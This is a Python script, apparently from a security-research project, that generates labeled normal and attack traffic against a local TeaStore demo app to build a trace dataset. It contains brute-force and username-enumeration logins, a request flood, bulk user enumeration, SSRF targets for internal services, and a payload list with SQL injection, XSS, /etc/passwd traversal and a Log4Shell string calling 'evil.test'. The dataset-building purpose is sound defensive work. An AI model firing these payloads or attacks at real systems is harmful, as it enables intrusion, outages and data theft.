#!/usr/bin/env python3
"""
generate_sut2_traffic.py — SecLogTrace SUT2 (TeaStore)
REPO LOCATION: scripts/collection/generate_sut2_traffic.py

Unified traffic generator for all 5 attack classes on SUT2, mirroring SUT1's
generate_abuse_traffic.py (credential_abuse/resource_exhaustion/injection) +
generate_ssrf_traffic.py, combined into one script since all 5 SUT2 classes
were designed together (docs/design/SUT2_ABUSE_CLASSES_DESIGN.md) and none
have been piloted yet, unlike SUT1 where SSRF came first as its own effort.

PREREQUISITE — persistence and image must be reachable from the host.
Only webui (8080) and db (3306) are published by default. Add to
docker-compose_otel.yaml:
    persistence:  ports: ["8081:8080"]
    image:        ports: ["8082:8080"]
then: docker compose -f docker-compose_otel.yaml up -d --force-recreate persistence image

Classes (all endpoints confirmed against TeaStore source, see the design doc).
STATUS as of 2026-09-17 (update as classes get piloted clean):
  credential_abuse     (CWE-307)  webui/loginAction
                        Piloted; normal-class usernames now discovered at
                        runtime (see discover_seed_data) after the original
                        hardcoded user1..user20 guess turned out not to match
                        TeaStore's actual (shuffled) usernames.
  resource_exhaustion  (CWE-400)  persistence/rest/products (unpaced burst)
                        Piloted clean, no fixes needed (0.49 req/s normal vs
                        13.33 req/s attack, both 200 throughout).
  injection            (CWE-89/943) persistence start/max query params
                        NOT YET WORKING — both normal and attack return 404
                        against this target. Root cause not yet found; do not
                        trust this class until it's debugged. TeaStore likely
                        parameterizes queries either way, so even once the
                        404s are fixed, expect the same honest "rejected
                        input" framing as SUT1's injection class, not real
                        exploitation.
  data_exfiltration    (n/a)      persistence/rest/users?max=-1 (bulk) vs.
                        persistence/rest/users/{real id} (one) — normal-class
                        id is now discovered at runtime (see
                        discover_seed_data) after a hardcoded users/1 404'd
                        (no such id in the real seed data).
  ssrf   (CWE-918, injected) image/rest/image/fetchFromUrl (attack) vs.
                        image/rest/image/getProductImages (normal).
                        Attack side piloted clean from the start. Normal side
                        FIXED and VERIFIED LIVE 2026-09-17: ImageSize wants
                        "WIDTHxHEIGHT", not a name — see the fetchFromUrl-
                        adjacent comment in run_ssrf() for the full story.

Usage:
    python scripts/collection/generate_sut2_traffic.py --class credential_abuse --mode pilot
    python scripts/collection/generate_sut2_traffic.py --class ssrf --mode normal --count 150
    python scripts/collection/generate_sut2_traffic.py --class data_exfiltration --mode attack --count 150

--mode pilot runs 15 normal, a 60s gap, then 15 attack, in two separately
logged windows — the same discipline every SUT1 class was piloted with.
Scale with --mode normal / --mode attack and --count 150 once the pilot's
corpus_audit.py --by-filename-label report shows ZERO multi-label traces.
"""

import argparse
import json
import sys
import time
from datetime import datetime, timezone

import requests

WEBUI = "http://localhost:8080/tools.descartes.teastore.webui"
PERSISTENCE = "http://localhost:8081/tools.descartes.teastore.persistence"
IMAGE = "http://localhost:8082/tools.descartes.teastore.image"

DEMO_PASSWORD = "password"


# ---------------------------------------------------------------------------
# Seed-data discovery. FIXED 2026-09-17: the original script assumed
# sequential IDs (user1..user20, product id 1) and hardcoded them. Real
# TeaStore seed data has non-sequential IDs and SHUFFLED usernames (verified:
# id=507 has userName="user25", id=508 has userName="user87", etc — the
# numeric suffix in the username does NOT match login order or id order).
# This caused: data_exfiltration's "normal" hitting users/1 (404, no such
# id), ssrf's "normal" hitting product id 1 with size "FULL" (500, no such
# product / bad enum value), and — more seriously — credential_abuse's
# "normal" logins may not have exercised real accounts at all, since
# user1..user20 as LOGIN USERNAMES were never verified against real seed
# data. Fetch real values from the live service instead of guessing.
# ---------------------------------------------------------------------------
def discover_seed_data():
    r = requests.get(f"{PERSISTENCE}/rest/products?start=0&max=20", timeout=10)
    r.raise_for_status()
    products = r.json()
    if not products:
        sys.exit("No products found via persistence/rest/products — is the DB seeded?")
    product_ids = [p["id"] for p in products]

    r = requests.get(f"{PERSISTENCE}/rest/users?start=0&max=20", timeout=10)
    r.raise_for_status()
    users = r.json()
    if not users:
        sys.exit("No users found via persistence/rest/users — is the DB seeded?")
    usernames = [u["userName"] for u in users]
    user_ids = [u["id"] for u in users]

    print(f"Discovered {len(product_ids)} product IDs (e.g. {product_ids[:3]}), "
          f"{len(usernames)} usernames (e.g. {usernames[:3]}).")
    return product_ids, usernames, user_ids


PRODUCT_IDS = None   # populated by discover_seed_data() in main()
DEMO_USERS = None    # populated by discover_seed_data() in main()
USER_IDS = None      # populated by discover_seed_data() in main()


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def fire(session, method, url, label, log, **kwargs):
    t0 = time.time()
    entry = {"ts": now_iso(), "class_label": label, "url": url}
    try:
        r = session.request(method, url, timeout=15, **kwargs)
        entry["http_status"] = r.status_code
        entry["elapsed_s"] = round(time.time() - t0, 3)
        entry["redirect_to"] = r.headers.get("Location", "")
        try:
            entry["body_head"] = str(r.json())[:160]
        except Exception:
            entry["body_head"] = r.text[:160]
    except requests.RequestException as e:
        entry["error"] = str(e)
        entry["elapsed_s"] = round(time.time() - t0, 3)
    log.append(entry)
    return entry


# ---------------------------------------------------------------------------
# 1. credential_abuse (CWE-307) — POST webui/loginAction
# ---------------------------------------------------------------------------
def run_credential_abuse(mode, count, pace, log):
    session = requests.Session()
    url = f"{WEBUI}/loginAction"
    if mode == "normal":
        print(f"NORMAL credential_abuse: {count} correct-password logins -> {url}")
        for i in range(count):
            user = DEMO_USERS[i % len(DEMO_USERS)]
            e = fire(session, "POST", url, "normal",
                     log, data={"username": user, "password": DEMO_PASSWORD,
                                "signin": "Sign in"})
            print(f"  [{i+1:>3}/{count}] {user:<8} status={e.get('http_status','ERR')} "
                  f"redirect={e.get('redirect_to','')}")
            time.sleep(pace)
    else:
        # sub-types, weighted: bruteforce (real user, wrong pw) 2 : userenum
        # (nonexistent user) 1 — mirrors SUT1's cred_bruteforce/cred_userenum split
        print(f"ATTACK credential_abuse: {count} failed logins -> {url}")
        for i in range(count):
            if i % 3 == 2:
                sub, user, pw = "cred_userenum", f"nosuchuser{i}", "irrelevant"
            else:
                sub, user, pw = "cred_bruteforce", DEMO_USERS[i % len(DEMO_USERS)], f"wrong{i}"
            e = fire(session, "POST", url, sub,
                     log, data={"username": user, "password": pw, "signin": "Sign in"})
            print(f"  [{i+1:>3}/{count}] {sub:<16} status={e.get('http_status','ERR')} "
                  f"redirect={e.get('redirect_to','')}")
            time.sleep(pace)


# ---------------------------------------------------------------------------
# 2. resource_exhaustion (CWE-400) — persistence/rest/products, unpaced burst
# ---------------------------------------------------------------------------
def run_resource_exhaustion(mode, count, pace, log):
    session = requests.Session()
    url = f"{PERSISTENCE}/rest/products?start=0&max=-1"
    real_pace = pace if mode == "normal" else 0.0
    label = "normal" if mode == "normal" else "resource_flood"
    print(f"{mode.upper()} resource_exhaustion: {count} requests, "
          f"pace={real_pace}s -> {url}")
    t0 = time.time()
    for i in range(count):
        e = fire(session, "GET", url, label, log)
        n = 0
        try:
            n = len(json.loads(e.get("body_head", "[")) if False else [])
        except Exception:
            pass
        print(f"  [{i+1:>3}/{count}] status={e.get('http_status','ERR')} "
              f"{e.get('elapsed_s','')}s")
        if real_pace:
            time.sleep(real_pace)
    elapsed = time.time() - t0
    print(f"  {count} requests in {elapsed:.2f}s ({count/max(elapsed,0.01):.2f} req/s)")


# ---------------------------------------------------------------------------
# 3. injection (CWE-89/943) — persistence start/max query params
# TeaStore's CRUD params are int-parsed (parseIntQueryParam); like SUT1, this
# most likely characterizes as a REJECTED-INPUT signature, not successful
# exploitation. Report status + body honestly either way.
# ---------------------------------------------------------------------------
INJECTION_PAYLOADS = [
    "1' OR '1'='1", "1; DROP TABLE product;--", "{\"$ne\": null}",
    "1' UNION SELECT * FROM user--", "<script>alert(1)</script>",
    "../../../../etc/passwd", "${jndi:ldap://evil.test/a}",
]


def run_injection(mode, count, pace, log):
    session = requests.Session()
    base = f"{PERSISTENCE}/rest/products"
    if mode == "normal":
        print(f"NORMAL injection: {count} legitimate paged reads -> {base}")
        for i in range(count):
            e = fire(session, "GET", f"{base}?start=0&max=10", "normal", log)
            print(f"  [{i+1:>3}/{count}] status={e.get('http_status','ERR')}")
            time.sleep(pace)
    else:
        payloads = (INJECTION_PAYLOADS * ((count // len(INJECTION_PAYLOADS)) + 1))[:count]
        print(f"ATTACK injection: {count} malformed-param requests -> {base}")
        for i, payload in enumerate(payloads):
            e = fire(session, "GET", base, "injection_attempt", log,
                     params={"start": payload, "max": "10"})
            print(f"  [{i+1:>3}/{count}] payload={payload!r:<28} "
                  f"status={e.get('http_status','ERR')}")
            time.sleep(pace)


# ---------------------------------------------------------------------------
# 4. data_exfiltration — persistence/rest/users, bulk (?max=-1) vs. one record
# ---------------------------------------------------------------------------
def run_data_exfiltration(mode, count, pace, log):
    session = requests.Session()
    if mode == "normal":
        uid = USER_IDS[0]
        url = f"{PERSISTENCE}/rest/users/{uid}"
        print(f"NORMAL data_exfiltration: {count} single-record reads -> {url}")
        for i in range(count):
            e = fire(session, "GET", url, "normal", log)
            print(f"  [{i+1:>3}/{count}] status={e.get('http_status','ERR')}")
            time.sleep(pace)
    else:
        url = f"{PERSISTENCE}/rest/users?start=0&max=-1"
        print(f"ATTACK data_exfiltration: {count} bulk-enumeration reads -> {url}")
        for i in range(count):
            e = fire(session, "GET", url, "exfil_bulk_users", log)
            print(f"  [{i+1:>3}/{count}] status={e.get('http_status','ERR')} "
                  f"{e.get('elapsed_s','')}s")
            time.sleep(pace)


# ---------------------------------------------------------------------------
# 5. ssrf (CWE-918, injected) — image/rest/image/fetchFromUrl
# Weighted sub-types, same 3:2:1-style ratio as SUT1, headline target first.
# ---------------------------------------------------------------------------
SSRF_TARGETS = [
    ("ssrf_persistence", f"http://persistence:8080/tools.descartes.teastore.persistence/rest/users?start=0&max=-1", 3),
    ("ssrf_registry",    "http://registry:8080/tools.descartes.teastore.registry/rest/services", 2),
    ("ssrf_closed_port", "http://persistence:9999/", 1),
]


def _weighted_schedule(count):
    total_w = sum(w for _, _, w in SSRF_TARGETS)
    quotas, allocated = [], 0
    for i, (label, url, w) in enumerate(SSRF_TARGETS):
        n = count - allocated if i == len(SSRF_TARGETS) - 1 else round(count * w / total_w)
        quotas.append([label, url, n]); allocated += n
    schedule, taken = [], {q[0]: 0 for q in quotas}
    for _ in range(count):
        cand = max((q for q in quotas if taken[q[0]] < q[2]),
                   key=lambda q: (q[2] - taken[q[0]]) / q[2] if q[2] else 0, default=None)
        if cand is None:
            break
        schedule.append((cand[0], cand[1])); taken[cand[0]] += 1
    return schedule


def run_ssrf(mode, count, pace, log):
    session = requests.Session()
    url = f"{IMAGE}/rest/image/fetchFromUrl"
    if mode == "normal":
        # FIXED 2026-09-17: ImageSize.parseImageSize() takes a "WIDTHxHEIGHT"
        # string, NOT a named size — confirmed from the real exception when
        # this was still guessed as FULL/PREVIEW/ICON:
        # "Malformed string supplied. Does not contain exactly two size
        # values divided by 'x'." (100% 500s across 15 requests, all product
        # IDs, all three guesses — ruled out "wrong value," pointed at
        # "wrong format").
        # "400x400" VERIFIED LIVE against the running image service same day:
        #   curl -i -X POST .../rest/image/getProductImages -d '{"7":"400x400"}'
        #   -> HTTP/1.1 200, body {"7":"data:image/png;base64,..."} — a real
        #   decoded PNG, not just a 200 with an empty/error body. This is now
        #   a confirmed-correct normal-class request, not a guess pending
        #   verification.
        size_candidates = ["400x400"]
        print(f"NORMAL ssrf: {count} legitimate image lookups -> "
              f"{IMAGE}/rest/image/getProductImages")
        for i in range(count):
            pid = PRODUCT_IDS[i % len(PRODUCT_IDS)]
            size = size_candidates[i % len(size_candidates)]
            e = fire(session, "POST", f"{IMAGE}/rest/image/getProductImages", "normal",
                     log, json={str(pid): size})
            print(f"  [{i+1:>3}/{count}] product={pid} size={size:<8} "
                  f"status={e.get('http_status','ERR')}")
            time.sleep(pace)
    else:
        schedule = _weighted_schedule(count)
        print(f"ATTACK ssrf: {count} requests, weighted across "
              f"{len(SSRF_TARGETS)} targets -> {url}")
        for i, (label, target) in enumerate(schedule):
            e = fire(session, "POST", url, label, log,
                     data=target, headers={"Content-Type": "text/plain"})
            print(f"  [{i+1:>3}/{count}] {label:<18} status={e.get('http_status','ERR')} "
                  f"{e.get('elapsed_s','')}s")
            time.sleep(pace)


RUNNERS = {
    "credential_abuse": run_credential_abuse,
    "resource_exhaustion": run_resource_exhaustion,
    "injection": run_injection,
    "data_exfiltration": run_data_exfiltration,
    "ssrf": run_ssrf,
}


def write_log(log, path):
    with open(path, "w") as fh:
        for e in log:
            fh.write(json.dumps(e) + "\n")
    print(f"Session log written: {path}")


def main():
    global PRODUCT_IDS, DEMO_USERS, USER_IDS
    ap = argparse.ArgumentParser()
    ap.add_argument("--class", dest="cls", required=True, choices=list(RUNNERS))
    ap.add_argument("--mode", choices=["normal", "attack", "pilot"], required=True)
    ap.add_argument("--count", type=int, default=150)
    ap.add_argument("--pace", type=float, default=2.0)
    ap.add_argument("--out-dir", default="data/raw/traffic")
    a = ap.parse_args()

    print("Discovering real seed data (IDs/usernames — do not hardcode these)...")
    PRODUCT_IDS, DEMO_USERS, USER_IDS = discover_seed_data()
    # Let the benign discovery GETs (to products/users) settle into an earlier
    # clock second than the first session request. Windowed trace export has
    # 1-second granularity, so this keeps discovery traffic out of the labeled
    # corpus window.
    time.sleep(3)
    print()

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    runner = RUNNERS[a.cls]

    if a.mode == "pilot":
        nlog, alog = [], []
        print(f"=== PILOT: {a.cls} — 15 normal, 60s gap, 15 attack ===\n")
        print(f"Session start: {now_iso()}\n")
        runner("normal", 15, a.pace, nlog)
        write_log(nlog, f"{a.out_dir}/sut2_{a.cls}_pilot_normal_{stamp}.jsonl")
        print("\n--- 60s gap to keep export windows separable ---")
        time.sleep(60)
        print()
        runner("attack", 15, a.pace, alog)
        write_log(alog, f"{a.out_dir}/sut2_{a.cls}_pilot_attack_{stamp}.jsonl")
        print(f"\nSession end: {now_iso()}")
        print("\nExport each window separately with explicit --start/--end,")
        print("then corpus_audit.py --by-filename-label. Expect ZERO")
        print("multi-label traces before scaling with --count 150.")
        return

    log = []
    print(f"Session start: {now_iso()}\n")
    runner(a.mode, a.count, a.pace, log)
    write_log(log, f"{a.out_dir}/sut2_{a.cls}_{a.mode}_{stamp}.jsonl")
    print(f"Session end: {now_iso()}")


if __name__ == "__main__":
    if "-h" not in sys.argv and "--help" not in sys.argv:
        try:
            import requests  # noqa
        except ImportError:
            sys.exit("requests not installed: pip install --user requests")
    main()
